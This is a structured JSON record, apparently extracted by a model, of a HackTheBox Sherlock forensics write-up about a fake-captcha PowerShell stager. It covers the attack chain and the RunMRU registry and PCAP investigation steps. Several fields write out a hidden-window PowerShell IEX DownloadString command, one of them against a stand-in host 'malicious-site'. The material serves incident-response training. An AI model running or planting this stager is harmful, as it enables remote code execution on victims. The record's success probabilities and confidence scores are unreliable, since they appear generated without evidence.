{
  "writeup_id": "Htb_Sherlock_Pikaptcha",
  "scenario_fingerprint": {
    "scenario_name": "fake_captcha_powershell_stager",
    "primary_services": [
      "http",
      "https",
      "powershell"
    ],
    "port_signature": "80+443+reverse_shell_port",
    "service_combination": "web+powershell+c2",
    "os_family": "windows_client",
    "environment_type": "corporate_workstation",
    "entry_vector": "social_engineering_captcha",
    "privilege_path": "user_execution_to_reverse_shell",
    "attack_complexity": "easy",
    "estimated_time": "15-30 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "fake_captcha_interface",
      "clipboard_manipulation",
      "windows_run_dialog_abuse",
      "powershell_memory_execution"
    ],
    "environmental_clues": [
      "runmru_registry_artifacts",
      "phishing_email_vector",
      "microsoft_office_lure",
      "pcap_network_evidence"
    ],
    "similar_scenarios": [
      "lumma_stealer_captcha",
      "fake_update_campaigns"
    ],
    "unique_aspects": [
      "captcha_to_powershell_workflow",
      "clipboard_payload_delivery",
      "run_dialog_execution_method"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Malicious Captcha Social Engineering",
        "success_reason": "User tricked into manually executing PowerShell command through fake captcha verification",
        "prerequisite_indicators": [
          "phishing_email_delivered",
          "user_clicked_malicious_link",
          "fake_captcha_page_loaded",
          "windows_run_dialog_accessible"
        ],
        "recognition_patterns": [
          "captcha requests copy-paste commands",
          "powershell commands in clipboard",
          "RunMRU registry entries with suspicious commands",
          "user reports captcha but no expected download"
        ],
        "failure_modes": [
          "user_recognizes_suspicious_captcha",
          "powershell_execution_blocked",
          "user_doesnt_follow_captcha_instructions",
          "security_awareness_training_effective"
        ],
        "environmental_factors": [
          "powershell_execution_policy_unrestricted",
          "no_clipboard_monitoring",
          "user_has_admin_privileges",
          "lack_of_security_awareness"
        ],
        "success_probability": 0.73,
        "typical_timeframe": "2-5 minutes"
      },
      {
        "technique": "PowerShell Stager Download",
        "success_reason": "Initial PowerShell command successfully downloaded and executed secondary payload in memory",
        "prerequisite_indicators": [
          "internet_connectivity_available",
          "powershell_execution_allowed",
          "c2_server_accessible",
          "no_network_filtering"
        ],
        "recognition_patterns": [
          "powershell with downloadstring methods",
          "invoke-expression of remote content",
          "base64 encoded commands",
          "fileless execution patterns"
        ],
        "failure_modes": [
          "network_blocked_c2_domain",
          "powershell_constrained_language_mode",
          "antivirus_blocks_download",
          "proxy_filtering_active"
        ],
        "environmental_factors": [
          "unrestricted_internet_access",
          "minimal_endpoint_protection",
          "powershell_v3_or_higher",
          "user_context_execution"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "30-60 seconds"
      },
      {
        "technique": "Reverse Shell Establishment",
        "success_reason": "Downloaded PowerShell script established persistent reverse shell connection to C2",
        "prerequisite_indicators": [
          "payload_executed_successfully",
          "outbound_connections_allowed",
          "c2_listener_active",
          "no_egress_filtering"
        ],
        "recognition_patterns": [
          "persistent tcp connections to external IPs",
          "powershell processes with network activity",
          "unusual outbound port connections",
          "interactive shell traffic patterns"
        ],
        "failure_modes": [
          "firewall_blocks_outbound_connections",
          "c2_server_unavailable",
          "network_monitoring_detects_anomaly",
          "process_killed_by_security_tools"
        ],
        "environmental_factors": [
          "permissive_firewall_rules",
          "no_network_monitoring",
          "stable_internet_connection",
          "c2_infrastructure_operational"
        ],
        "success_probability": 0.78,
        "typical_timeframe": "1-3 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "RunMRU registry entries with malicious PowerShell commands",
        "discovery_method": "Registry hive analysis of happy.grunwald user",
        "why_critical": "Contains the exact command executed by user through Windows Run dialog",
        "how_to_recognize": [
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
          "powershell commands with downloadstring",
          "base64 encoded payloads",
          "recent timestamp correlation"
        ],
        "follow_up_actions": [
          "decode_base64_commands",
          "analyze_download_urls",
          "check_network_traffic_correlation",
          "timeline_user_activity"
        ]
      },
      {
        "discovery": "Network traffic showing payload download and C2 communication",
        "discovery_method": "PCAP analysis of network communications",
        "why_critical": "Reveals C2 infrastructure, payload hashes, and communication duration",
        "how_to_recognize": [
          "http requests to suspicious domains",
          "powershell script downloads",
          "persistent tcp connections",
          "reverse shell traffic patterns"
        ],
        "follow_up_actions": [
          "extract_downloaded_payloads",
          "calculate_file_hashes",
          "identify_c2_ports_and_duration",
          "analyze_malicious_javascript"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "user_context",
        "escalation_method": "social_engineering_to_code_execution",
        "why_possible": "User manually executed attacker-provided PowerShell commands believing it was captcha verification",
        "recognition_signs": [
          "fake_captcha_pages_requesting_commands",
          "clipboard_manipulation_javascript",
          "powershell_execution_through_run_dialog",
          "phishing_emails_with_office_update_themes"
        ],
        "exploitation_path": "Phishing Email → Fake Captcha → Manual Command Execution → Reverse Shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Received PCAP and registry artifacts from compromised system with suspected malicious captcha attack",
        "decision": "Analyze RunMRU registry key first to identify executed commands",
        "reasoning": "RunMRU contains history of commands executed via Windows Run dialog, which is the attack vector for fake captcha attacks",
        "confidence": 0.95,
        "alternatives": [
          {
            "option": "pcap_analysis",
            "when": "if registry analysis fails"
          },
          {
            "option": "prefetch_analysis",
            "when": "if need execution timeline"
          }
        ],
        "success_indicators": [
          "powershell_command_found_in_runmru",
          "base64_encoded_payload_identified",
          "download_url_discovered"
        ],
        "next_decision": "decode_and_analyze_payload"
      },
      {
        "step": 2,
        "situation": "Found PowerShell command with base64 encoded payload in RunMRU",
        "decision": "Decode base64 payload and analyze network traffic for payload download",
        "reasoning": "Fake captcha attacks typically use PowerShell to download and execute secondary payloads",
        "confidence": 0.9,
        "prerequisites": [
          "base64_payload_extracted",
          "pcap_available"
        ],
        "success_indicators": [
          "payload_decoded",
          "download_url_identified",
          "secondary_script_hash_obtained"
        ],
        "failure_fallbacks": [
          "static_payload_analysis",
          "timeline_reconstruction"
        ]
      },
      {
        "step": 3,
        "situation": "Identified secondary PowerShell script download",
        "decision": "Extract script from network traffic and analyze for C2 communication",
        "reasoning": "Secondary scripts typically establish reverse shells or download additional malware",
        "confidence": 0.85,
        "prerequisites": [
          "network_traffic_available",
          "script_download_identified"
        ],
        "success_indicators": [
          "reverse_shell_connection_found",
          "c2_port_identified",
          "connection_duration_measured"
        ],
        "failure_fallbacks": [
          "payload_static_analysis",
          "dns_analysis"
        ]
      }
    ],
    "branching_logic": {
      "if_runmru_analysis_succeeds": {
        "action": "decode_powershell_payload",
        "tools": [
          "registry_explorer",
          "base64_decoder",
          "powershell_analysis"
        ],
        "next_phase": "network_traffic_correlation"
      },
      "if_payload_decoded": {
        "action": "extract_iocs_and_analyze_network",
        "alternatives": [
          "wireshark_analysis",
          "tshark_filtering",
          "zeek_logs"
        ],
        "decision_criteria": "based_on_payload_complexity"
      },
      "if_network_analysis_complete": {
        "action": "timeline_reconstruction",
        "purpose": "establish_attack_sequence_and_duration",
        "tools": [
          "wireshark",
          "timeline_analysis",
          "log_correlation"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_runmru_for_fake_captcha_attacks",
        "reasoning": "fake_captcha_attacks_specifically_target_windows_run_dialog",
        "applicability": "suspected_fake_captcha_incidents"
      },
      {
        "rule": "correlate_registry_timestamps_with_network_traffic",
        "reasoning": "provides_precise_attack_timeline_and_validates_findings",
        "applicability": "incidents_with_both_endpoint_and_network_data"
      },
      {
        "rule": "analyze_powershell_payloads_for_staged_downloads",
        "reasoning": "modern_attacks_use_multi_stage_payloads_to_evade_detection",
        "applicability": "powershell_based_initial_access"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Malicious Captcha PowerShell Execution",
        "mitre_id": "T1059.001",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "web_browser_access",
          "powershell_available",
          "windows_run_dialog_accessible",
          "clipboard_manipulation_possible"
        ],
        "success_indicators": [
          "runmru_registry_entries",
          "powershell_execution_artifacts",
          "network_connections_to_c2",
          "downloaded_payload_artifacts"
        ],
        "incompatible_with": [
          "powershell_execution_policy_blocked",
          "clipboard_access_restricted",
          "network_egress_blocked"
        ],
        "confidence_boosters": [
          "fake_captcha_webpage_detected",
          "social_engineering_lure_present",
          "base64_encoded_powershell_commands"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "2-5 minutes"
      },
      {
        "technique": "Registry RunMRU Analysis",
        "mitre_id": "T1112",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "registry_access_available",
          "ntuser_dat_accessible",
          "forensic_tools_available"
        ],
        "success_indicators": [
          "runmru_key_contains_commands",
          "powershell_commands_in_history",
          "execution_timestamps_available"
        ],
        "incompatible_with": [
          "registry_access_denied",
          "runmru_key_cleared",
          "system_reimaged"
        ],
        "confidence_boosters": [
          "recent_runmru_entries",
          "suspicious_command_patterns",
          "base64_encoded_content"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "PowerShell In-Memory Script Execution",
        "mitre_id": "T1059.001",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "powershell_available",
          "network_connectivity",
          "script_download_capability"
        ],
        "success_indicators": [
          "network_traffic_to_script_url",
          "powershell_process_artifacts",
          "memory_resident_execution",
          "reverse_shell_connections"
        ],
        "incompatible_with": [
          "powershell_disabled",
          "network_isolation",
          "script_blocking_enabled"
        ],
        "confidence_boosters": [
          "iex_invoke_expression_usage",
          "downloadstring_method_calls",
          "obfuscated_powershell_commands"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "1-3 minutes"
      },
      {
        "technique": "Reverse Shell Establishment",
        "mitre_id": "T1059",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "windows",
          "linux"
        ],
        "environmental_prerequisites": [
          "outbound_network_connectivity",
          "command_execution_capability",
          "c2_server_accessible"
        ],
        "success_indicators": [
          "persistent_network_connection",
          "command_shell_process_spawned",
          "bidirectional_communication_established"
        ],
        "incompatible_with": [
          "egress_filtering_strict",
          "command_execution_blocked",
          "c2_server_unreachable"
        ],
        "confidence_boosters": [
          "non_standard_port_usage",
          "long_duration_connections",
          "interactive_command_patterns"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "immediate"
      }
    ],
    "environmental_detectors": {
      "windows_registry": {
        "port_indicators": [],
        "service_indicators": [],
        "file_indicators": [
          "NTUSER.DAT",
          "UsrClass.dat",
          "ntuser.dat.LOG"
        ],
        "confidence_threshold": 0.95
      },
      "powershell_execution": {
        "port_indicators": [],
        "service_indicators": [
          "powershell"
        ],
        "process_indicators": [
          "powershell.exe",
          "pwsh.exe"
        ],
        "confidence_threshold": 0.9
      },
      "web_based_attack": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "content_indicators": [
          "captcha",
          "fake_download",
          "social_engineering"
        ],
        "confidence_threshold": 0.85
      },
      "network_c2_communication": {
        "port_indicators": [
          4444,
          8080,
          443,
          80
        ],
        "service_indicators": [
          "tcp"
        ],
        "traffic_indicators": [
          "persistent_connections",
          "reverse_shell_patterns"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "registry_runmru_analysis",
          "when": "windows_system_detected",
          "reason": "high_success_rate_reveals_executed_commands"
        },
        {
          "attack": "pcap_network_analysis",
          "when": "network_capture_available",
          "reason": "reveals_c2_communication_and_payload_downloads"
        }
      ],
      "medium_priority": [
        {
          "attack": "powershell_artifact_analysis",
          "when": "powershell_execution_detected",
          "reason": "reveals_in_memory_script_execution"
        },
        {
          "attack": "prefetch_analysis",
          "when": "windows_prefetch_files_available",
          "reason": "shows_process_execution_timeline"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Malicious Captcha Social Engineering",
        "mitre_id": "T1204.002",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "fake_captcha_webpage",
            "command_template": "User instructed to copy/paste PowerShell command via fake captcha",
            "actual_command": "powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('{malicious_url}')\"",
            "output_pattern": "PowerShell execution via Windows Run dialog",
            "effectiveness_rating": 4,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "user_interaction_required",
          "windows_run_dialog_accessible",
          "powershell_available",
          "internet_connectivity"
        ],
        "success_indicators": [
          "powershell_execution_in_runmru_registry",
          "network_connection_to_c2",
          "payload_downloaded_successfully"
        ],
        "common_failures": [
          "user_recognizes_social_engineering",
          "security_software_blocks_execution",
          "network_filtering_prevents_download"
        ],
        "follow_up_techniques": [
          "powershell_in_memory_execution",
          "reverse_shell_establishment",
          "credential_harvesting"
        ],
        "time_investment": "2-5 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "PowerShell In-Memory Execution",
        "mitre_id": "T1059.001",
        "category": "execution",
        "phase": "execution",
        "tools_used": [
          {
            "name": "powershell",
            "command_template": "powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('{url}')\"",
            "actual_command": "Executed via Windows Run dialog from fake captcha",
            "output_pattern": "Hidden PowerShell window execution",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "net.webclient",
            "command_template": "(New-Object Net.WebClient).DownloadString('{url}')",
            "actual_command": "Downloads and executes PowerShell script in memory",
            "output_pattern": "Script executed without touching disk",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "powershell_available",
          "internet_connectivity",
          "execution_policy_allows_scripts"
        ],
        "success_indicators": [
          "script_downloaded_successfully",
          "in_memory_execution_completed",
          "no_file_artifacts_on_disk"
        ],
        "common_failures": [
          "execution_policy_restrictions",
          "antivirus_detection",
          "network_connectivity_issues"
        ],
        "follow_up_techniques": [
          "reverse_shell_connection",
          "persistence_mechanisms",
          "lateral_movement"
        ],
        "time_investment": "1-2 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Reverse Shell via PowerShell",
        "mitre_id": "T1059.001",
        "category": "command_and_control",
        "phase": "command_and_control",
        "tools_used": [
          {
            "name": "powershell_reverse_shell",
            "command_template": "PowerShell TCP reverse shell connection",
            "actual_command": "Embedded in downloaded PowerShell script",
            "output_pattern": "TCP connection to attacker C2 server",
            "effectiveness_rating": 4,
            "reliability": 0.8
          }
        ],
        "prerequisites": [
          "powershell_execution_successful",
          "outbound_network_connectivity",
          "c2_server_listening"
        ],
        "success_indicators": [
          "tcp_connection_established",
          "interactive_shell_available",
          "commands_executed_successfully"
        ],
        "common_failures": [
          "firewall_blocking_outbound_connections",
          "c2_server_unavailable",
          "network_monitoring_detection"
        ],
        "follow_up_techniques": [
          "system_enumeration",
          "privilege_escalation",
          "data_exfiltration"
        ],
        "time_investment": "Immediate upon execution",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Registry Analysis (RunMRU)",
        "use_case": "command_execution_forensics",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "windows_forensics",
          "execution_analysis"
        ],
        "alternatives": [
          "prefetch_analysis",
          "event_log_analysis"
        ],
        "best_practices": [
          "examine_ntuser_dat_for_user_specific_activity",
          "correlate_with_network_traffic",
          "check_timestamps_for_execution_timeline"
        ]
      },
      {
        "tool": "PCAP Analysis",
        "use_case": "network_traffic_investigation",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "medium",
        "essential_for": [
          "network_forensics",
          "c2_communication_analysis"
        ],
        "alternatives": [
          "netflow_analysis",
          "proxy_logs"
        ],
        "best_practices": [
          "filter_by_suspicious_domains",
          "extract_downloaded_payloads",
          "analyze_connection_duration_and_patterns"
        ]
      },
      {
        "tool": "PowerShell Script Analysis",
        "use_case": "malware_payload_examination",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "medium",
        "essential_for": [
          "powershell_malware_analysis",
          "obfuscation_detection"
        ],
        "alternatives": [
          "dynamic_analysis",
          "sandbox_execution"
        ],
        "best_practices": [
          "deobfuscate_encoded_commands",
          "identify_c2_infrastructure",
          "extract_iocs_for_threat_hunting"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "fake_captcha_to_reverse_shell",
        "steps": [
          {
            "step": 1,
            "command": "User visits malicious captcha page",
            "purpose": "Social engineering lure",
            "expected_output": "Fake captcha with copy/paste instructions"
          },
          {
            "step": 2,
            "command": "User copies malicious PowerShell command to clipboard",
            "purpose": "Payload delivery via clipboard manipulation",
            "expected_output": "PowerShell command in clipboard"
          },
          {
            "step": 3,
            "command": "User pastes and executes via Windows Run dialog (Win+R)",
            "purpose": "Initial execution",
            "expected_output": "Hidden PowerShell process starts"
          },
          {
            "step": 4,
            "command": "powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/script.ps1')\"",
            "purpose": "Download and execute second stage payload",
            "expected_output": "PowerShell script downloaded and executed in memory"
          },
          {
            "step": 5,
            "command": "Reverse shell connection established to C2 server",
            "purpose": "Command and control channel",
            "expected_output": "TCP connection to attacker infrastructure"
          }
        ],
        "success_rate": 0.75,
        "typical_duration": "30 seconds to 2 minutes"
      },
      {
        "sequence_name": "forensic_investigation_workflow",
        "steps": [
          {
            "step": 1,
            "command": "Analyze user registry hive (NTUSER.DAT) for RunMRU entries",
            "purpose": "Identify executed commands",
            "expected_output": "PowerShell command with full parameters"
          },
          {
            "step": 2,
            "command": "Extract timestamps from registry for execution timeline",
            "purpose": "Establish attack timeline",
            "expected_output": "UTC timestamp of malicious execution"
          },
          {
            "step": 3,
            "command": "Analyze PCAP for HTTP requests to malicious domains",
            "purpose": "Identify payload download",
            "expected_output": "PowerShell script content and SHA256 hash"
          },
          {
            "step": 4,
            "command": "Examine TCP connections for reverse shell activity",
            "purpose": "Identify C2 communication",
            "expected_output": "Destination port and connection duration"
          },
          {
            "step": 5,
            "command": "Analyze JavaScript from malicious captcha page",
            "purpose": "Understand attack mechanism",
            "expected_output": "Function name containing clipboard manipulation code"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "30-60 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Pikaptcha",
      "difficulty": "Easy",
      "os": "Windows",
      "platform": "HackTheBox Sherlock",
      "release_date": "2024-10-22",
      "author": "CyberJunkie",
      "estimated_time": "30-45 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "low",
      "skill_level_required": "beginner",
      "primary_attack_vectors": [
        "social_engineering",
        "malicious_captcha",
        "powershell"
      ],
      "key_vulnerabilities": [
        "user_manipulation",
        "powershell_execution",
        "registry_persistence"
      ],
      "environment_type": "windows_endpoint",
      "real_world_relevance": "very_high",
      "learning_value": [
        "dfir_analysis",
        "pcap_analysis",
        "registry_forensics",
        "powershell_attacks"
      ],
      "prerequisite_knowledge": [
        "basic_windows_forensics",
        "network_analysis",
        "registry_structure"
      ]
    },
    "categorization": {
      "primary_category": "digital_forensics",
      "subcategories": [
        "incident_response",
        "malware_analysis",
        "network_forensics"
      ],
      "attack_types": [
        "initial_access",
        "execution",
        "command_and_control"
      ],
      "defensive_lessons": [
        "user_awareness_training",
        "powershell_monitoring",
        "network_monitoring",
        "email_security"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Insider",
        "Noted",
        "Reminiscent"
      ],
      "similarity_reasons": [
        "dfir_focus",
        "windows_artifacts",
        "powershell_analysis",
        "network_traffic_analysis"
      ],
      "unique_aspects": [
        "fake_captcha_attack",
        "runmru_analysis",
        "september_2024_attack_technique"
      ],
      "difficulty_factors": [
        "straightforward_artifact_analysis",
        "clear_attack_timeline",
        "well_defined_iocs"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T03:34:58.572144",
    "original_file": "0xdf_writeups/Htb Sherlock Pikaptcha.md",
    "content_length": 34238,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}